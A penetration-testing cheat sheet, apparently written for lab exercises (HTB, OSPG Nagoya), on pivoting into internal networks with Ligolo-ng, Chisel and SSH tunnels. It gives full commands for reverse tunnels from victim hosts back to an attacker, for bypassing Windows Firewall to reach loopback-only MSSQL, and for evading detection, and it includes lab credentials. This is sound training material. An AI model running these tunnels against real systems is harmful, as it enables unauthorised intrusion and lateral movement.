# Tunneling Guide


## Ligolo
When you need full network pivoting (subnets, scans)


#### Prep/Level Setting

- [ ] `K:>` Check we dont have a ligolo link listed
```
ip link show
```
- [ ] `K:>` - If we do, set it down
```
sudo ip link set ligolo down
```
- [ ] `K:>` Then delete it
```
sudo ip tuntap del dev ligolo mode tun
```

#### Create a local interface
(This can be left for any future tunnels too)

- [ ] On Kali **Configure** the local interface - Creates a **virtual network interface** named `ligolo` of type **TUN** (network layer tunnel)
```
sudo ip tuntap add dev ligolo mode tun
```
- [ ] **Activate** the interface. Until you bring it _up_, no traffic will flow through it. The kernel ignores the interface even if it exists.
```
sudo ip link set ligolo up
```

- [ ] Add the internal subnet to the interface for local reach
```
sudo ip route add 172.16.139.0/24 dev ligolo
```

- [ ] Ligolo Magic IP — add this too, you'll need it (see edge case section below)
```
sudo ip route add 240.0.0.1/32 dev ligolo
```

#### Starting the tunnel

- [ ] `K:>` Copy the proxy binary to your `pwd` or location for the tunnel
```
cp /home/kali/Tools/ImmidiateTools/proxy .
```

- [ ] `K:>` Start the ligolo Proxy
```
sudo ./proxy -selfcert -laddr 0.0.0.0:4443
```

- [ ] `CP:>` Launch the agent (you should see the callback to your proxy above)
```
agent.exe -connect 192.168.45.202:4443 -ignore-cert
```

- [ ] `LG:>` Choose your recently connected session
```
session
[choose your agent session]
```
```
start
```

- [ ] To add Agent side additional routes, we add a route for the hidden IP range via the ligolo interface
```
sudo ip route add 172.16.139.0/16 via 240.0.0.1 dev ligolo
```

---

### ⚠️ Edge Case — Service is firewalled or loopback-only (e.g. MSSQL on Nagoya)

**The problem:**
A service might show `0.0.0.0:1433` in netstat — meaning it's *willing* to accept connections on any interface — but Windows Firewall is a completely separate layer and can still block inbound connections from outside. You'll know this is happening when:
```
nc -zv TARGET_IP 1433   # hangs = firewall blocking
nc -zv TARGET_IP 1433   # refused = nothing listening
```
Hanging means the service is there but the firewall is dropping your packets before they ever reach it.

**Why Ligolo's normal routing doesn't help here:**
Ligolo creates a virtual network interface. By default it *routes* traffic — meaning your packet arrives at the target as a brand new inbound connection. The firewall judges it exactly like any other external connection and drops it.

**Why Chisel cuts through:**
Chisel and SSH are pure tunnels — all traffic rides *inside* the already-established outbound connection. The firewall never sees a new inbound connection because there isn't one.

**How to make Ligolo behave the same way — the Magic IP:**
Ligolo has a hardcoded IP range `240.0.0.0/4` specifically for this. Querying anything in that range tells Ligolo to carry the traffic *inside the tunnel* and deliver it to the agent's own `127.0.0.1` — bypassing the firewall exactly like Chisel does.

The `240.0.0.1` address never actually exists on the target. The proxy intercepts that destination, recognises it as the magic range, and tells the agent to connect to its own loopback. The agent never sees `240.0.0.1` — it just gets an instruction to connect to `127.0.0.1` internally. The route on your Kali is just the entry point — the actual magic happens in the proxy-to-agent handoff.

```
Your Kali                    Ligolo Proxy              Agent (on target)
    |                             |                          |
    | → packet to 240.0.0.1:1433 |                          |
    |        ↓                   |                          |
    | kernel sees route:          |                          |
    | 240.0.0.1/32 dev ligolo     |                          |
    |        ↓                   |                          |
    | sends it down ligolo iface  |                          |
    |        ↓                   |                          |
    |    proxy receives it        |                          |
    |    sees 240.x destination   |                          |
    |    knows = magic loopback   |                          |
    |        ↓                   |                          |
    |              tunnels it ────────────────────→         |
    |                             |      agent rewrites dst  |
    |                             |      240.0.0.1 → 127.0.0.1:1433
    |                             |                          |
    |                             |              connects to its own
    |                             |              127.0.0.1:1433 internally
```

```
# One time setup (if not already added)
sudo ip route add 240.0.0.1/32 dev ligolo
```

Then point your tool at `240.0.0.1` instead of the real target IP:
```bash
# Plain auth example
impacket-mssqlclient domain/user:pass@240.0.0.1 -windows-auth

# Kerberos / silver ticket example — also update /etc/hosts
impacket-mssqlclient -k nagoya.nagoya-industries.com -target-ip 240.0.0.1
```

For Kerberos auth, `/etc/hosts` needs to point the hostname at wherever the tunnel delivers:
```
# With magic IP (Ligolo)
240.0.0.1    nagoya.nagoya-industries.com NAGOYA-INDUSTRIES.COM

# With Chisel
127.0.0.1    nagoya.nagoya-industries.com NAGOYA-INDUSTRIES.COM

# Direct / no tunnel needed
192.168.205.21    nagoya.nagoya-industries.com NAGOYA-INDUSTRIES.COM
```

**Quick decision:**
```
nc hangs?
  YES → use 240.0.0.1 magic IP
  NO, refused → nothing listening, wrong port
  NO, connects → go direct, no tunnel needed

VPN already owns the target subnet (ip route shows it via tun0)?
  YES → Ligolo route won't take effect, use 240.0.0.1 instead
```

---

**Special things from HTB**
- [ ] `MT:>` Set up a port forward for RDP session to go to the 172 machine
```
portfwd add -l 1234 -p 3389 -r 172.16.139.50
```
```
xfreerdp3 /v:127.0.0.1:1234 /u:"inlanefreight\svc_sql" /p:"lucky7" /dynamic-resolution /drive:Shared,/home/kali/Tools/ImmidiateTools
```

---

## SSH tunnel — getting local attacker ports to and from the deep network

Make local ports 6666, 7777 and 8888 accessible to the Deep Victim via the jump Victim
```
ssh USERNAME@192.168.102.227 -D1080 -R *:6666:localhost:6666 -R *:7777:localhost:7777 -R *:8888:localhost:8888
```

Login via ssh from Kali with a key on port 2222, send back victim's port 8000 to local port 9999
```
ssh -i id_ecdsa -L 9999:127.0.0.1:8000 USERNAME@192.168.102.227 -p 2222
```

---

## Chisel

When you want quick port forward for UIs/services —
**!!!Make sure** you have compatible architectures - https://github.com/jpillora/chisel/releases

`OPT:` Get chisel.exe in your pwd to upload to the victim
```
cp /home/kali/Tools/ImmidiateTools/chisel.exe .
```

### Windows/Kali example
Example from OSPG Nagoya — want access to firewalled MSSQL (1433).

**Attacker (Kali)**
```
chisel server --reverse -p 9999
```

**Victim (reverse shell or agent)**
`R` = Remote config, sending back victim port 1433 to attacker port 1433
```
chisel.exe client 192.168.45.202:9999 R:1433:127.0.0.1:1433
```

Then connect via your local loopback:
```
impacket-mssqlclient 'nagoya-industries.com/svc_mssql:Service1@127.0.0.1' -windows-auth
```

Multiple ports example — webapp on 8080 and mysql on 33060:
```
chisel.exe client 192.168.45.202:9999 R:8080:127.0.0.1:80 R:33060:127.0.0.1:3306
```

### Linux/Kali example

**Attacker machine**
```
./chisel server --reverse --port 9000
```

**Victim machine**
```
./chisel client 192.168.45.202:9000 R:65432:127.0.0.1:65432
```

---

## IF ....

- Need a single firewalled or loopback service, fast → **Chisel** (one line, always tunnels)
- Need full network access, scanning, lateral movement → **Ligolo** (full subnet routing)
- Service is firewalled but you're already in Ligolo → **Ligolo magic IP 240.0.0.1** (forces tunnelling mode)
- Have SSH access → **SSH** (most reliable, native port forwards and SOCKS)

---

**The core difference between Chisel and Ligolo — worth understanding:**

**Chisel / SSH** — pure tunnels. All traffic rides inside the established outbound connection. The firewall never sees a new inbound connection. Always works for loopback and firewalled services.

**Ligolo (default)** — creates a virtual NIC and *routes* traffic. Your packet arrives at the target as a brand new inbound connection. Powerful for subnet access but the firewall can still block individual ports.

**Ligolo + magic IP 240.0.0.1** — forces Ligolo into tunnelling mode for that connection. Traffic rides inside the tunnel just like Chisel. Use this whenever nc hangs or the VPN already owns the target subnet.

```
Chisel / SSH       → always tunnelling, no choice needed
Ligolo default     → routing (new inbound, firewall applies)
Ligolo + 240.x     → tunnelling (inside existing connection, firewall bypassed)
```

---

```
chisel: dead-simple TCP port punching — perfect for "I just need 1433 and maybe 88"

ligolo-ng: full layer-3 tunnel (TUN iface) — great when you want to route to multiple
hosts/ports without individual forwards (BloodHound/LDAP/SMB all at once). More setup
but more power. Use magic IP when you hit firewall walls.
```

| Feature / Need                           | **SSH**                                  | **Chisel**                                 | **Ligolo-NG**                                        |
| ---------------------------------------- | ---------------------------------------- | ------------------------------------------ | ---------------------------------------------------- |
| **Protocol layer**                       | Secure shell (L7 / application)          | TCP tunnel (L4)                            | TUN-based (L3, full IP forwarding)                   |
| **Needs pre-existing access**            | ✅ Yes (user credentials + port open)     | ❌ No (can run from a reverse shell)        | ❌ No (agent can run in memory)                       |
| **Works with `localhost`-only services** | ✅ Yes (e.g., `-L 8080:127.0.0.1:80`)     | ✅ Yes (e.g., `R:8080:127.0.0.1:80`)        | ✅ Yes — but use magic IP 240.0.0.1                   |
| **Bypasses Windows Firewall**            | ✅ Yes (tunnelled)                        | ✅ Yes (tunnelled)                          | ✅ Yes — but only with magic IP, not default routing  |
| **Can expose internal subnets**          | ❌ Only via SOCKS5 + proxychains          | ❌ No subnet routing, just individual ports | ✅ Full subnet access via routing                     |
| **SOCKS5 support**                       | ✅ Native (`-D` flag)                     | ✅ Via proxychains                          | ❌ No SOCKS support                                   |
| **Firewall evasion**                     | 🚫 Needs open port                       | ✅ Excellent (reverse tunnel, HTTP/WS)      | ✅ Good (TLS reverse agent)                           |
| **Complexity**                           | 🟢 Simple (once SSH access is available) | 🟢 Very simple (1 line)                    | 🔴 More setup — routes, TUN, magic IP edge cases      |
| **Reliability**                          | ✅ Production-level reliable              | ✅ Very stable                              | 🟡 Powerful but more moving parts                    |
| **Best Use Case**                        | Full shell access + tunnels              | Quick reverse port access to services      | Full pivoting, internal net exploration               |

| Situation                                                         | Tool to Use              | Why                                                                 |
| ----------------------------------------------------------------- | ------------------------ | ------------------------------------------------------------------- |
| 🟢 You have SSH access                                            | **SSH**                  | Most reliable, encrypted, native port forwards, SOCKS               |
| 🔁 Shell but no SSH, need quick port access                       | **Chisel**               | Reverse tunnel, always tunnels, one line                            |
| 🕸️ Full internal network access                                  | **Ligolo-NG**            | Full IP tunnel, scan and move laterally across subnets              |
| 🧱 Service on loopback or firewalled (nc hangs)                   | **Ligolo magic IP** or **Chisel** | Both tunnel from inside — firewall never sees inbound        |
| 🗺️ VPN already owns the target subnet                            | **Ligolo magic IP**      | Route conflict means direct IP won't work — magic IP bypasses this  |
| 🧪 Multiple subnets, automated pivoting                           | **Ligolo-NG**            | Route internal ranges through TUN                                   |
| 🕵️ Need to evade detection/firewalls                             | **Chisel (reverse)**     | HTTP/WebSocket mode slides through egress                           |
| 🔐 Need encrypted + auditable access                              | **SSH**                  | Logs and crypto built in                                            |


TODO: https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/
TODO: https://docs.ligolo.ng/Localhost/